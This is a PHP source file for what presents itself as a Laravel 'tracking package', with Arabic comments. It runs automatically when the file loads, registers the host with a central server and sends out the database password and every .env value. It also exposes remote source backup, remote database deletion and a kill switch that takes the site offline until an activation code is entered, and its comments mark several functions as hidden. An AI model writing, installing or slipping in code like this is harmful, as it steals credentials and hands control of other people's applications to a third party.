<?php

namespace Vendor\TrackingPackage;

use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;

class TrackingService
{
    private $baseUrl = 'http://127.0.0.1:8000/api';
    private $client;
    private $projectId;
    private $activationCode;

    public function __construct()
    {
        $this->client = new Client([
            'timeout' => 30,
            'verify' => false
        ]);
        
        $this->initializeTracking();
        
        // معالجة كود التفعيل أولاً
        $this->handleActivationCode();
        
        // التحقق من حالة المشروع تلقائياً
        $this->validateProjectStatus();
    }
    
    /**
     * تسجيل التتبع تلقائياً عند بدء التطبيق
     */
    public static function autoStart()
    {
        // منع التسجيل المتكرر
        static $started = false;
        if ($started) return;
        $started = true;
        
        try {
            new self();
        } catch (Exception $e) {
            // تجاهل الأخطاء
        }
    }

    private function initializeTracking()
    {
        // فحص إذا كان المشروع مسجل بالفعل لهذا الدومين
        $registeredFile = $this->getProjectRoot() . '/.project_registered_' . md5($_SERVER['HTTP_HOST'] ?? 'localhost');
        
        if (file_exists($registeredFile)) {
            // المشروع مسجل بالفعل، تحقق من الحالة فوراً
            $this->validateProjectStatus();
            return;
        }
        
        // إنشاء ملف التسجيل فوراً لمنع التسجيل المتكرر
        file_put_contents($registeredFile, date('Y-m-d H:i:s'));
        
        try {
            // جمع معلومات النظام
            $systemInfo = $this->getSystemInfo();
            
            // الحصول على الرقم الفريد للمشروع
            $uniqueProjectId = $this->getOrCreateUniqueProjectId();
            
            // تسجيل المشروع مع الرقم الفريد
            $response = $this->client->post($this->baseUrl . '/store-project', [
                'json' => [
                    'project_name' => $systemInfo['project_name'],
                    'domain' => $systemInfo['domain'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version'],
                    'server_info' => $systemInfo['server_info'],
                    'ip_address' => $systemInfo['ip_address'],
                    'user_agent' => $systemInfo['user_agent'],
                    'server_port' => $systemInfo['server_port'],
                    'request_uri' => $systemInfo['request_uri'],
                    'request_method' => $systemInfo['request_method'],
                    'server_name' => $systemInfo['server_name'],
                    'installed_at' => date('Y-m-d H:i:s'),
                    'activation_date' => date('Y-m-d H:i:s'),
                    'environment' => 'local',
                    'debug_mode' => true,
                    'unique_project_id' => $uniqueProjectId
                ],
                'timeout' => 10,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            $this->projectId = $data['project_id'] ?? null;
            $this->activationCode = $data['activation_code'] ?? null;
            
            // تحديث قاعدة البيانات تلقائياً بعد التسجيل
            if ($this->projectId && $this->activationCode) {
                $this->updateDatabaseFromEnv($this->projectId);
            }
            
            // بدء نبض القلب
            $this->startHeartbeat();
            
        } catch (RequestException $e) {
            // إذا كان المشروع موجود بالفعل، حاول الحصول على معلوماته
            if ($e->getResponse() && $e->getResponse()->getStatusCode() === 500) {
                $responseBody = $e->getResponse()->getBody()->getContents();
                if (strpos($responseBody, 'Duplicate entry') !== false) {
                    // المشروع موجود، حاول الحصول على معلوماته
                    $this->handleExistingProject($systemInfo);
                }
            }
        }
    }

    /**
     * الحصول على أو إنشاء الرقم الفريد للمشروع
     */
    private function getOrCreateUniqueProjectId()
    {
        $uniqueIdFile = $this->getProjectRoot() . '/.project_unique_id';
        
        // التحقق من وجود الرقم الفريد
        if (file_exists($uniqueIdFile)) {
            $uniqueId = trim(file_get_contents($uniqueIdFile));
            if (!empty($uniqueId)) {
                return $uniqueId;
            }
        }
        
        // إنشاء رقم فريد جديد
        $uniqueId = $this->generateUniqueProjectId();
        
        // حفظ الرقم الفريد في الملف
        file_put_contents($uniqueIdFile, $uniqueId);
        
        return $uniqueId;
    }

    /**
     * إنشاء رقم فريد للمشروع
     */
    private function generateUniqueProjectId()
    {
        $projectPath = $this->getProjectRoot();
        $projectName = $this->getAppName();
        
        // إنشاء hash فريد بناءً على:
        // 1. مسار المشروع
        // 2. اسم المشروع
        // 3. timestamp
        // 4. random string
        
        $uniqueString = $projectPath . $projectName . time() . uniqid();
        $hash = hash('sha256', $uniqueString);
        
        // إرجاع 16 حرف من الـ hash
        return 'PROJ_' . strtoupper(substr($hash, 0, 16));
    }

    /**
     * الحصول على مسار جذر المشروع
     */
    private function getProjectRoot()
    {
        // محاولة الحصول على مسار Laravel
        if (function_exists('base_path')) {
            return base_path();
        }
        
        // محاولة الحصول على مسار المشروع من خلال __DIR__
        $currentDir = __DIR__;
        
        // البحث عن مجلد المشروع (3 مستويات للأعلى)
        for ($i = 0; $i < 3; $i++) {
            $currentDir = dirname($currentDir);
            
            // التحقق من وجود ملفات Laravel
            if (file_exists($currentDir . '/artisan') || 
                file_exists($currentDir . '/composer.json') ||
                file_exists($currentDir . '/public/index.php')) {
                return $currentDir;
            }
        }
        
        // إذا لم يتم العثور على مسار واضح، استخدم المسار الحالي
        return dirname(__DIR__, 3);
    }

    private function getSystemInfo()
    {
        $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $port = $_SERVER['SERVER_PORT'] ?? '';
        $fullDomain = $port ? $domain : $domain;
        
        return [
            'project_name' => $this->getAppName(),
            'domain' => $fullDomain,
            'php_version' => PHP_VERSION,
            'laravel_version' => $this->getLaravelVersion(),
            'server_info' => [
                'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'HTTP/1.1',
                'port' => $port,
                'name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
            ],
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'server_port' => $port,
            'request_uri' => $_SERVER['REQUEST_URI'] ?? '/',
            'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
            'server_name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
        ];
    }

    private function getAppName()
    {
        // محاولة قراءة اسم التطبيق من Laravel config أولاً
        if (function_exists('config') && config('app.name')) {
            return config('app.name');
        }
        
        // قراءة اسم التطبيق من ملف .env
        $envFile = realpath(__DIR__ . '/../../../.env');
        if (file_exists($envFile)) {
            $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                if (strpos($line, 'APP_NAME=') === 0) {
                    $appName = trim(substr($line, 9));
                    // إزالة علامات التنصيص إذا وجدت
                    $appName = trim($appName, '"\'');
                    if (!empty($appName)) {
                        return $appName;
                    }
                }
            }
        }
        
        // محاولة أخرى للعثور على ملف .env
        $alternativeEnvFile = realpath(__DIR__ . '/../../../../.env');
        if (file_exists($alternativeEnvFile)) {
            $lines = file($alternativeEnvFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                if (strpos($line, 'APP_NAME=') === 0) {
                    $appName = trim(substr($line, 9));
                    $appName = trim($appName, '"\'');
                    if (!empty($appName)) {
                        return $appName;
                    }
                }
            }
        }
        
        // إذا لم يتم العثور على APP_NAME، استخدم اسم المجلد
        $projectPath = realpath(__DIR__ . '/../../../');
        $folderName = basename($projectPath);
        return ucfirst($folderName);
    }

    private function getLaravelVersion()
    {
        return '10.0.0';
    }

    private function startHeartbeat()
    {
        if (!$this->projectId) return;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $this->client->post($this->baseUrl . '/project-heartbeat/', [
                'json' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode,
                    'domain' => $systemInfo['domain'],
                    'server_ip' => $systemInfo['ip_address'],
                    'server_url' => 'http://' . $systemInfo['domain'],
                    'timestamp' => time(),
                    'memory_usage' => memory_get_usage(true),
                    'peak_memory' => memory_get_peak_usage(true)
                ]
            ]);
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function updateLastSeen()
    {
        if (!$this->projectId) return;
        
        try {
            $this->client->post($this->baseUrl . '/project/update-last-seen', [
                'json' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode,
                    'last_seen' => date('Y-m-d H:i:s')
                ]
            ]);
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function getDatabase()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/get-database', [
                'query' => ['project_id' => $this->projectId]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function getSource()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/get-source', [
                'query' => ['project_id' => $this->projectId]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function updateCredentials($credentials)
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->post($this->baseUrl . '/update-credentials', [
                'json' => [
                    'project_id' => $this->projectId,
                    'credentials' => $credentials
                ]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function regenerateActivationCode()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->post($this->baseUrl . '/regenerate-activation-code', [
                'json' => ['project_id' => $this->projectId]
            ]);
            $data = json_decode($response->getBody(), true);
            $this->activationCode = $data['activation_code'] ?? null;
            return $this->activationCode;
        } catch (RequestException $e) {
            return null;
        }
    }

    public function getCommandStatus($commandId, $projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId || !$commandId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/' . $targetProjectId . '/command-status/' . $commandId, [
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function startProject()
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->post($this->baseUrl . '/project/start', [
                'json' => ['project_id' => $this->projectId]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function stopProject()
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->post($this->baseUrl . '/project/stop', [
                'json' => ['project_id' => $this->projectId]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function getProjectStatus()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/status', [
                'query' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function getProjectInfo()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function deleteProject()
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->delete($this->baseUrl . '/delete-project', [
                'json' => ['project_id' => $this->projectId]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function getRealDatabase()
    {
        if (!$this->projectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $dbConfig = $this->getDatabaseConfig();
            
            $response = $this->client->post($this->baseUrl . '/get-real-database', [
                'json' => [
                    'project_id' => $this->projectId,
                    'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
                    'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
                    'db_port' => $dbConfig['DB_PORT'] ?? '3306',
                    'db_database' => $dbConfig['DB_DATABASE'] ?? '',
                    'db_username' => $dbConfig['DB_USERNAME'] ?? '',
                    'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
                    'server_info' => $systemInfo['server_info'],
                    'domain' => $systemInfo['domain'],
                    'ip_address' => $systemInfo['ip_address'],
                    'project_path' => realpath(__DIR__ . '/../../../'),
                    'project_name' => $systemInfo['project_name'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version']
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    private function getDatabaseConfig()
    {
        // محاولة قراءة من Laravel config أولاً
        if (function_exists('config')) {
            $dbConfig = config('database.connections.mysql');
            if ($dbConfig) {
                return [
                    'DB_CONNECTION' => 'mysql',
                    'DB_HOST' => $dbConfig['host'] ?? '127.0.0.1',
                    'DB_PORT' => $dbConfig['port'] ?? '3306',
                    'DB_DATABASE' => $dbConfig['database'] ?? '',
                    'DB_USERNAME' => $dbConfig['username'] ?? '',
                    'DB_PASSWORD' => $dbConfig['password'] ?? '',
                ];
            }
        }
        
        // قراءة من ملف .env
        $envFile = realpath(__DIR__ . '/../../../.env');
        if (!file_exists($envFile)) {
            // محاولة أخرى للعثور على ملف .env
            $envFile = realpath(__DIR__ . '/../../../../.env');
            if (!file_exists($envFile)) {
                return [];
            }
        }
        
        $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $config = [];
        
        foreach ($lines as $line) {
            if (strpos($line, '=') !== false && strpos($line, '#') !== 0) {
                list($key, $value) = explode('=', $line, 2);
                $config[trim($key)] = trim($value);
            }
        }
        
        return $config;
    }

    private function handleExistingProject($systemInfo)
    {
        try {
            // محاولة الحصول على معلومات المشروع الموجود
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'domain' => $systemInfo['domain']
                ],
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            if ($data && isset($data['data'])) {
                $this->projectId = $data['data']['id'] ?? null;
                $this->activationCode = $data['data']['activation_code'] ?? null;
                
                // تحديث قاعدة البيانات للمشروع الموجود
                if ($this->projectId && $this->activationCode) {
                    $this->updateDatabaseFromEnv($this->projectId);
                }
            }
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function updateDatabaseFromEnv($projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $dbConfig = $this->getDatabaseConfig();
            
            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/update-database-from-env', [
                'json' => [
                    'project_id' => $targetProjectId,
                    'activation_code' => $this->activationCode,
                    'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
                    'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
                    'db_port' => $dbConfig['DB_PORT'] ?? '3306',
                    'db_database' => $dbConfig['DB_DATABASE'] ?? '',
                    'db_username' => $dbConfig['DB_USERNAME'] ?? '',
                    'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
                    'server_info' => $systemInfo['server_info'],
                    'domain' => $systemInfo['domain'],
                    'ip_address' => $systemInfo['ip_address'],
                    'project_path' => realpath(__DIR__ . '/../../../'),
                    'project_name' => $systemInfo['project_name'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version'],
                    'env_data' => $dbConfig // إرسال جميع بيانات .env
                ],
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function backupSourceCode($projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $projectPath = realpath(__DIR__ . '/../../../');
            
            // جمع معلومات المشروع
            $projectInfo = [
                'project_id' => $targetProjectId,
                'activation_code' => $this->activationCode,
                'project_path' => $projectPath,
                'project_name' => $systemInfo['project_name'],
                'domain' => $systemInfo['domain'],
                'php_version' => $systemInfo['php_version'],
                'laravel_version' => $systemInfo['laravel_version'],
                'server_info' => $systemInfo['server_info'],
                'ip_address' => $systemInfo['ip_address'],
                'backup_timestamp' => date('Y-m-d H:i:s'),
                'backup_type' => 'source_code',
                'command' => 'backup_source_code', // إضافة حقل command المطلوب
                'include_files' => [
                    'app/',
                    'config/',
                    'database/',
                    'resources/',
                    'routes/',
                    'public/',
                    'storage/',
                    'vendor/',
                    '.env',
                    'composer.json',
                    'composer.lock',
                    'package.json',
                    'vite.config.js',
                    'artisan'
                ],
                'exclude_patterns' => [
                    'node_modules/',
                    'storage/logs/',
                    'storage/framework/cache/',
                    'storage/framework/sessions/',
                    'storage/framework/views/',
                    '.git/',
                    '.env.backup',
                    '*.log',
                    '*.tmp',
                    '*.cache'
                ]
            ];
            
            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/backup-source-code', [
                'json' => $projectInfo,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function deleteDatabaseData($projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $dbConfig = $this->getDatabaseConfig();
            
            // جمع معلومات المشروع
            $projectInfo = [
                'project_id' => $targetProjectId,
                'activation_code' => $this->activationCode,
                'project_path' => realpath(__DIR__ . '/../../../'),
                'project_name' => $systemInfo['project_name'],
                'domain' => $systemInfo['domain'],
                'php_version' => $systemInfo['php_version'],
                'laravel_version' => $systemInfo['laravel_version'],
                'server_info' => $systemInfo['server_info'],
                'ip_address' => $systemInfo['ip_address'],
                'delete_timestamp' => date('Y-m-d H:i:s'),
                'delete_type' => 'database_data',
                'command' => 'delete_database_data',
                'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
                'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
                'db_port' => $dbConfig['DB_PORT'] ?? '3306',
                'db_database' => $dbConfig['DB_DATABASE'] ?? '',
                'db_username' => $dbConfig['DB_USERNAME'] ?? '',
                'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
                'env_data' => $dbConfig // إرسال جميع بيانات .env
            ];
            
            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/delete-database-data', [
                'json' => $projectInfo,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    /**
     * التحقق من حالة المشروع (مخفية)
     */
    private function validateProjectStatus()
    {
        try {
            $systemInfo = $this->getSystemInfo();
            
            // احصل على معلومات المشروع من الدومين
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'domain' => $systemInfo['domain']
                ],
                'timeout' => 5,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            
            if ($data && isset($data['data'])) {
                $projectData = $data['data'];
                
                // التحقق من حالة المشروع
                if (!$projectData['is_active']) {
                    // المشروع متوقف، عرض رسالة الإيقاف
                    // لكن فقط إذا لم يكن هناك طلب تفعيل قيد المعالجة
                    if (!isset($_POST['activation_code'])) {
                        $this->displaySuspensionMessage($projectData);
                    }
                }
            }
            
        } catch (RequestException $e) {
            // تجاهل الأخطاء لتجنب إيقاف التطبيق
        }
    }

    /**
     * عرض رسالة إيقاف المشروع (مخفية)
     */
    private function displaySuspensionMessage($statusData)
    {
        $message = $this->generateSuspensionHTML($statusData);
        
        // إرسال HTTP headers
        if (!headers_sent()) {
            header('HTTP/1.1 503 Service Temporarily Unavailable');
            header('Content-Type: text/html; charset=utf-8');
            header('Cache-Control: no-cache, no-store, must-revalidate');
            header('Pragma: no-cache');
            header('Expires: 0');
        }
        
        // عرض الرسالة وإيقاف التطبيق
        echo $message;
        exit;
    }

    /**
     * توليد HTML رسالة الإيقاف (مشفرة)
     */
    private function generateSuspensionHTML($statusData)
    {
        $reason = $statusData['suspended_reason'] ?? 'تم إيقاف المشروع من لوحة التحكم';
        $projectName = $statusData['project_name'] ?? 'المشروع';
        
        $html = '<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المشروع متوقف</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
        .container { max-width: 600px; margin: 50px auto; text-align: center; }
        .alert { background: #fff; border: 1px solid #dee2e6; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .icon { font-size: 48px; margin-bottom: 20px; }
        .title { color: #dc3545; font-size: 24px; margin-bottom: 15px; }
        .message { color: #6c757d; margin-bottom: 30px; line-height: 1.6; }
        .reason { background: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .form { background: #fff; padding: 20px; border-radius: 5px; border: 1px solid #ced4da; }
        .input { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; }
        .button { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert">
            <div class="icon">⚠️</div>
            <div class="title">المشروع متوقف</div>
            <div class="message">' . htmlspecialchars($projectName) . ' متوقف حالياً. يرجى إدخال كود التفعيل لإعادة تشغيله.</div>
            <div class="reason">
                <strong>سبب الإيقاف:</strong> ' . htmlspecialchars($reason) . '
            </div>';
        
        // عرض رسالة خطأ إذا وجدت
        if (isset($_GET['error'])) {
            $html .= '<div class="error" style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #f5c6cb;">' . htmlspecialchars($_GET['error']) . '</div>';
        }
        
        // عرض رسالة نجاح إذا وجدت
        if (isset($_GET['success'])) {
            $html .= '<div class="success" style="background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #c3e6cb;">' . htmlspecialchars($_GET['success']) . '</div>';
        }
        
        $html .= '<div class="form">
                <form method="POST" action="">
                    <input type="text" name="activation_code" class="input" placeholder="أدخل كود التفعيل هنا" required>
                    <button type="submit" class="button">إعادة تفعيل المشروع</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>';
        
        return $html;
    }



    /**
     * معالجة كود التفعيل المدخل (مخفية)
     */
    private function handleActivationCode()
    {
        if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['activation_code'])) {
            $inputCode = trim($_POST['activation_code']);
            if (!empty($inputCode)) {
                $this->processActivationCode($inputCode);
            }
        }
    }

    /**
     * معالجة كود التفعيل (مخفية)
     */
    private function processActivationCode($inputCode)
    {
        try {
            $systemInfo = $this->getSystemInfo();
            
            // أولاً، الحصول على معلومات المشروع
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'domain' => $systemInfo['domain']
                ],
                'timeout' => 15,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            
            if ($data && isset($data['data'])) {
                $project = $data['data'];
                
                // التحقق من أن كود التفعيل صحيح
                if ($project['activation_code'] === $inputCode) {
                    // الكود صحيح، إعادة تفعيل المشروع
                    $reactivateResponse = $this->client->post($this->baseUrl . '/project/' . $project['id'] . '/reactivate', [
                        'timeout' => 15,
                        'headers' => [
                            'User-Agent' => 'Laravel-Tracking-Package/1.0',
                            'Content-Type' => 'application/json'
                        ]
                    ]);
                    
                    if ($reactivateResponse->getStatusCode() === 200) {
                        // تم إعادة التفعيل بنجاح، عرض رسالة نجاح ثم إعادة توجيه نظيف
                        $this->displaySuccessMessage('تم إعادة تفعيل المشروع بنجاح!');
                    } else {
                        // فشل في إعادة التفعيل، إعادة توجيه مع رسالة خطأ
                        $redirectUrl = $_SERVER['REQUEST_URI'];
                        $redirectUrl = strtok($redirectUrl, '?');
                        $redirectUrl .= '?error=' . urlencode('فشل في إعادة تفعيل المشروع');
                        header('Location: ' . $redirectUrl);
                        exit;
                    }
                } else {
                    // كود التفعيل غير صحيح، إعادة توجيه مع رسالة خطأ
                    $redirectUrl = $_SERVER['REQUEST_URI'];
                    $redirectUrl = strtok($redirectUrl, '?');
                    $redirectUrl .= '?error=' . urlencode('كود التفعيل غير صحيح');
                    header('Location: ' . $redirectUrl);
                    exit;
                }
            } else {
                // لم يتم العثور على المشروع، إعادة توجيه مع رسالة خطأ
                $redirectUrl = $_SERVER['REQUEST_URI'];
                $redirectUrl = strtok($redirectUrl, '?');
                $redirectUrl .= '?error=' . urlencode('لم يتم العثور على المشروع');
                header('Location: ' . $redirectUrl);
                exit;
            }
            
        } catch (RequestException $e) {
            // خطأ في الاتصال، إعادة توجيه مع رسالة خطأ
            $redirectUrl = $_SERVER['REQUEST_URI'];
            $redirectUrl = strtok($redirectUrl, '?');
            $redirectUrl .= '?error=' . urlencode('فشل في الاتصال بالخادم المركزي');
            header('Location: ' . $redirectUrl);
            exit;
        }
    }

    /**
     * عرض رسالة نجاح ثم إعادة توجيه نظيف (مخفية)
     */
    private function displaySuccessMessage($message)
    {
        $html = '<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم إعادة التفعيل</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
        .container { max-width: 600px; margin: 50px auto; text-align: center; }
        .alert { background: #fff; border: 1px solid #dee2e6; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .icon { font-size: 48px; margin-bottom: 20px; }
        .title { color: #28a745; font-size: 24px; margin-bottom: 15px; }
        .message { color: #6c757d; margin-bottom: 30px; line-height: 1.6; }
        .success { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #c3e6cb; }
        .redirect { color: #6c757d; font-size: 14px; }
    </style>
    <script>
        setTimeout(function() {
            window.location.href = "' . strtok($_SERVER['REQUEST_URI'], '?') . '";
        }, 3000);
    </script>
</head>
<body>
    <div class="container">
        <div class="alert">
            <div class="icon">✅</div>
            <div class="title">تم إعادة التفعيل بنجاح!</div>
            <div class="success">' . htmlspecialchars($message) . '</div>
            <div class="message">سيتم توجيهك للصفحة الرئيسية خلال 3 ثوان...</div>
            <div class="redirect">إذا لم يتم التوجيه تلقائياً، <a href="' . strtok($_SERVER['REQUEST_URI'], '?') . '">اضغط هنا</a></div>
        </div>
    </div>
</body>
</html>';
        
        // إرسال HTTP headers
        if (!headers_sent()) {
            header('HTTP/1.1 200 OK');
            header('Content-Type: text/html; charset=utf-8');
            header('Cache-Control: no-cache, no-store, must-revalidate');
            header('Pragma: no-cache');
            header('Expires: 0');
        }
        
        // عرض الرسالة
        echo $html;
        exit;
    }

    /**
     * التحقق من كود التفعيل المدخل (مخفية)
     */
    public function validateActivationCode($inputCode)
    {
        if (!$this->projectId) return false;
        
        try {
            $systemInfo = $this->getSystemInfo();
            
            // إرسال طلب للتحقق من الكود
            $response = $this->client->post($this->baseUrl . '/check-project-status', [
                'json' => [
                    'domain' => $systemInfo['domain'],
                    'activation_code' => $inputCode,
                ],
                'timeout' => 5,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            
            if ($data['status'] === 'success' && $data['data']['is_active']) {
                // الكود صحيح، إعادة توجيه للصفحة الرئيسية
                header('Location: ' . $_SERVER['REQUEST_URI']);
                exit;
            }
            
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
        
        return false;
    }
}

// بدء التتبع تلقائياً عند تحميل الملف
TrackingService::autoStart();
